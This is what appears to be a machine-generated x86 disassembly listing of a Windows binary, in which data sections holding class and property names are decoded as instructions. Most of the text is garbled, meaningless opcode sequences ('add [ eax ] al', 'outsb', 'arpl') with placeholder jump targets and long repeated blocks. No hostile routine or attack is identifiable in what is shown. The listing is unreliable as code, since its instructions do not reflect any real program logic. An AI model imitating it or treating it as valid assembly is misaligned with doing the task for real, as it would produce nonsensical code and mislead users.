jb r-xdata
add [ eax ] al
add [ edx + 0x280046e6 ] dl
add [ eax ] al
add [ esp + edi ] ah
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
test al 0xe6
inc esi
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
cmp al 0x47
add al dh
cmp eax 0x6f600047
inc ecx
add [ eax - 0x77ffbe91 ] dl
outsd
inc ecx
add [ eax + 0xe00473c ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] ch
push 0x7000416b
imul eax [ ecx ] 0xffffffe4
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dl
in eax 0x46
add [ esi ] al
push 0x78655473
je r-xdata
adc [ eax ] al
push ds
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
pushad
out 0x46 al
add [ eax + 0xb00413c ] dh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x6e774f73
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
0x200044 0xff00
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
jmp [ esi + edi ]
inc ecx
add [ eax + eax ] ah
add bh bh
pop esp
cmp eax 0x3d700047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
insb
jae r-xdata
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
insb
jae r-xdata
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ esi + ebp * 2 ] dl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add ah ah
inc eax
add [ ecx + edi ] bl
jb r-xdata
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
add [ ebx + esi ] al
inc ecx
add [ eax + eax ] bl
add bh bh
adc al 0x3e
push sub_46e5bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5c4
retn
shl [ eax - 0x1a ] 0x46
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb91a ] al
out 0x46 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
pushad
out 0x46 al
insd
inc ebx
je r-xdata
inc ebx
outsd
sub_46e854
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x46e89c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
call sub_46e8ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
call 0xffffffffe912e8b8
inc esi
add [ eax + eax ] bl
add [ eax ] al
fdivr [ ecx + eax * 2 ]
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
je r-xdata
add [ esi * 2 + 0x75080041 ] al
inc ecx
add [ esp + esi * 2 + 0x3f7c0041 ] bh
inc edi
add ah bh
jo r-xdata
popad
jb r-xdata
outsd
outsb
jae r-xdata
je r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx ] al
add bh bh
adc al 0x54
inc ebx
jne r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 ] cl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
add [ eax ] al
jne r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
call 0x3dcee93d
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
jae r-xdata
insb
jae r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
je r-xdata
je r-xdata
jae r-xdata
pop es
add [ ebx + 0x46e90cc0 ] cl
add [ eax ] cl
pop ss
push esp
inc ebx
jne r-xdata
pop es
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
outsb
push cs
push esp
dec eax
popad
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
insd
dec eax
popad
dec ecx
outsb
je r-xdata
outsd
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
add al 0x8
outsd
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
je r-xdata
push es
push ebx
outsb
jb r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
dec eax
popad
jb r-xdata
outsd
outsb
je r-xdata
or [ ecx ] cl
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jb r-xdata
insb
lea eax [ eax ]
insb
0x11080046 0x5354
imul ebp [ edi + 0x6e ] 0x63617254
arpl [ ebx + 0x45 ] bp
jbe r-xdata
outsd
outsb
je r-xdata
or eax 0x64616548
jb r-xdata
jns r-xdata
add [ eax ] cl
insd
inc esp
jb r-xdata
add [ ebx + edx * 2 ] ecx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
push esp
inc ebx
jne r-xdata
popad
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jb r-xdata
arpl [ ebx + 0x53 ] bp
push ebx
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insd
jb r-xdata
je r-xdata
outsb
add [ eax + ecx ] al
push es
push ebx
outsb
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
in al 0xe9
inc esi
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] dl
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsb
test cl ch
inc esi
ja r-xdata
inc esi
add [ eax + 0x2 ] bh
add [ eax ] al
adc edx [ eax + ecx * 2 + 0x65 ]
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch ch
je r-xdata
inc esi
insb
popad
inc ebp
jbe r-xdata
insb
outsd
ja r-xdata
imul ebp [ edi + 0x6e ] 0x6c410901
je r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsb
lea eax [ eax ]
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ ebx + ebp * 8 + 0x46 ] al
add [ ecx ] cl
push 0x74754273
outsd
outsb
je r-xdata
jb r-xdata
popad
pop es
inc edx
outsd
outsd
insb
popad
outsb
mov eax eax
loopne r-xdata
inc esi
or [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
jb r-xdata
je r-xdata
outsb
je r-xdata
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 - 0x1313ffba ] bl
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
int3
inc ebx
outsd
jae r-xdata
outsb
je r-xdata
inc esp
add [ eax ] al
outsb
jae r-xdata
in eax dx
outsd
insb
or [ ecx + 0x6c ] eax
inc esi
add [ eax ] cl
and [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
jb r-xdata
outsb
insd
dec eax
popad
jb r-xdata
add cl [ eax ]
or eax 0x64616548
jb r-xdata
jne r-xdata
outsb
je r-xdata
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
nop
dec eax
jmp r-xdata
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al bh
aas
inc edi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x4c1c0044
inc edi
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] ah
inc ecx
inc edi
add [ esi + edx * 2 + 0x424c0044 ] ah
inc edi
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ edx + eax * 2 - 0x7b67ffb9 ] dh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add al cl
push ecx
inc edi
add [ eax ] al
push edx
inc edi
add [ edi + ecx * 2 ] dh
inc edi
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
out 0x41 al
insb
jae r-xdata
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
fild [ ebx ]
adc al 0xe9
jne r-xdata
add cl [ eax ]
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
je r-xdata
push 0x616c4673
add [ eax ] eax
add [ eax ] al
inc esp
jmp r-xdata
outsd
insd
dec eax
inc ebx
inc ebx
jb r-xdata
outsd
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
add [ eax ] al
add [ eax ] cl
jb r-xdata
inc eax
add ah cl
jmp r-xdata
dec edi
inc edi
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
je r-xdata
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
jns r-xdata
popad
je r-xdata
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsd
insb
outsb
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec esi
outsd
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
inc eax
inc edi
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc eax
add [ esi + esi + 0x40 ] dh
add al cl
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] eax
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
je r-xdata
je r-xdata
insd
dec eax
popad
jb r-xdata
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
sub_46e8ac
add al 0x75
inc ecx
add [ eax ] cl
jne r-xdata
add [ eax + 0x413d ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
add [ esp + esi * 2 + 0x3f7c0041 ] bh
inc edi
add ah bh
jo r-xdata
jae r-xdata
insb
jae r-xdata
je r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx ] al
add bh bh
jae r-xdata
pop es
add [ ebx + 0x46e90cc0 ] cl
add [ eax ] cl
pop ss
push esp
inc ebx
jne r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
add al 0x8
outsd
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
je r-xdata
insb
lea eax [ eax ]
insb
0x11080046 0x5354
imul ebp [ edi + 0x6e ] 0x63617254
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
or eax 0x64616548
jb r-xdata
jns r-xdata
add [ eax ] cl
insd
inc esp
jb r-xdata
insd
jb r-xdata
je r-xdata
outsb
jb r-xdata
arpl [ ebx + 0x53 ] bp
add [ eax + ecx ] al
push es
push ebx
outsb
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
in al 0xe9
inc esi
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] dl
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsb
test cl ch
inc esi
ja r-xdata
add [ ebx + ebp * 8 + 0x46 ] al
add [ ecx ] cl
push 0x74754273
outsd
outsb
je r-xdata
popad
pop es
inc edx
outsd
outsd
insb
popad
outsb
mov eax eax
loopne r-xdata
insb
outsd
ja r-xdata
imul ebp [ edi + 0x6e ] 0x6c410901
je r-xdata
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
or [ ebx ] cl
inc esi
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
jb r-xdata
je r-xdata
dec eax
popad
jb r-xdata
outsb
je r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
inc esp
add [ eax ] al
outsb
jae r-xdata
in eax dx
outsd
insb
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or [ ecx + 0x6c ] eax
inc esi
add [ eax ] cl
and [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
push es
push ebx
outsb
jb r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jb r-xdata
outsb
insd
dec eax
popad
jb r-xdata
add cl [ eax ]
or eax 0x64616548
jb r-xdata
je r-xdata
jne r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
push 0x616c4673
inc esi
add [ eax + 0x2 ] bh
add [ eax ] al
jb r-xdata
adc edx [ eax + ecx * 2 + 0x65 ]
popad
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
nop
dec eax
jmp r-xdata
add [ eax ] eax
add [ eax ] al
inc esp
jmp r-xdata
outsd
insd
dec eax
inc ebx
inc ebx
jb r-xdata
add [ ebx + edx * 2 ] ecx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
push esp
inc ebx
jne r-xdata
popad
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
outsd
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
dec ecx
outsb
je r-xdata
outsd
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al bh
aas
inc edi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x4c1c0044
inc edi
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] ah
inc ecx
inc edi
add [ esi + edx * 2 + 0x424c0044 ] ah
inc edi
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ edx + eax * 2 - 0x7b67ffb9 ] dh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add al cl
push ecx
inc edi
add [ eax ] al
push edx
inc edi
add [ edi + ecx * 2 ] dh
inc edi
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
out 0x41 al
insb
jae r-xdata
lea eax [ eax ]
int3
insd
inc ebx
je r-xdata
inc ebx
outsd
add [ eax ] al
add [ eax ] cl
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
jns r-xdata
popad
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 - 0x1313ffba ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch ch
je r-xdata
je r-xdata
inc esi
insb
popad
inc ebp
jbe r-xdata
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsd
insb
or [ ecx ] cl
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jb r-xdata
outsb
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec esi
outsd
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add ah cl
jmp r-xdata
inc eax
add [ esi + esi + 0x40 ] dh
add al cl
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] eax
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
outsb
je r-xdata
pop es
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
outsb
push cs
push esp
dec eax
popad
arpl [ ecx + ebp * 2 + 0x6f ] si
je r-xdata
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
inc eax
inc edi
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
fild [ ebx ]
adc al 0xe9
jne r-xdata
add cl [ eax ]
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
insd
dec eax
popad
je r-xdata
dec edi
inc edi
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
je r-xdata
outsd
outsb
je r-xdata
je r-xdata
insd
dec eax
popad
jb r-xdata
push ebx
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
outsd
outsb
je r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsb
lea eax [ eax ]
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
adc al 0x54
inc ebx
jne r-xdata
push eax
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
sub_46ecb7
[ eax + 0x43 ]
inc edi
add [ eax + ecx * 2 ] al
inc edi
add [ ecx + ecx * 2 ] bl
inc edi
add al al
dec esp
inc edi
add [ eax ] ah
dec ebp
inc edi
add ah cl
dec esi
inc edi
add [ eax + 0x45 ] ah
inc edi
add [ ebp + eax * 2 + 0x4fd00047 ] bl
inc edi
add [ eax - 0x43ffb8af ] ch
inc ebp
inc edi
add ah bl
inc ebp
inc edi
add [ ebx + eax * 2 + 0x54140047 ] dh
inc ebx
jne r-xdata
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
js r-xdata
add [ eax ] al
insd
dec eax
popad
jb r-xdata
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add dh bh
push 0x7873726f
xor eax [ ecx ]
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
lea eax [ eax ]
or ch ch
inc esi
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x48080014 ] al
outsd
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
inc [ esi + eax * 2 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
insd
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
push edx
outsd
jb r-xdata
add bh bh
jpe r-xdata
insd
dec eax
popad
jb r-xdata
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
insb
in al 0xfc
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
jae r-xdata
arpl [ ebx ] bp
adc [ eax ] al
push eax
add [ eax ] al
outsd
outsb
jae r-xdata
jmp r-xdata
popad
bound ebp [ ebp + 0x64 ]
in al 0xfc
outsb
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
mov eax 0x54004410
adc [ eax + eax ] eax
outsd
outsb
je r-xdata
insb
popad
jae r-xdata
jb r-xdata
fsub st0
inc esi
adc [ eax ] al
and [ edx ] al
add bh bh
or [ esi + 0x47 ] al
add [ eax + 0x440b0012 ] al
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
fiadd [ ebx ]
insb
add [ eax ] eax
jmp [ ebp + eax * 4 + 0x10044 ]
add [ eax ] cl
inc edx
outsd
insb
int3
outsd
or cl ch
inc esi
add [ eax + 0x2 ] al
add bh bh
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
jb r-xdata
adc al 0x4f
outsb
inc ebx
jb r-xdata
add [ eax ] cl
add al [ eax ]
[ eax + 0x46 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
imul ebp [ esi + 0x74 ] 0x46e8dc73
arpl [ ecx + ebp * 2 + 0x6f ] si
jmp r-xdata
add [ eax ] ch
add al [ eax ]
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
insb
inc esp
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080013 ] al
jne r-xdata
add [ eax ] ah
add al [ eax ]
dec [ eax ]
inc esi
inc edi
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
push esp
xor al 0x41
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
ja r-xdata
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
inc esi
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
[ esi + eax * 2 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jb r-xdata
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
ror [ eax + esi * 8 + 0x11080046 ] 0x54
inc esp
jb r-xdata
push ebx
sub cl 0x46
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
inc esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
sub cl 0x46
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
outsb
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ eax ] 0x0
int3
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
jae r-xdata
outsb
clc
ja r-xdata
dec esi
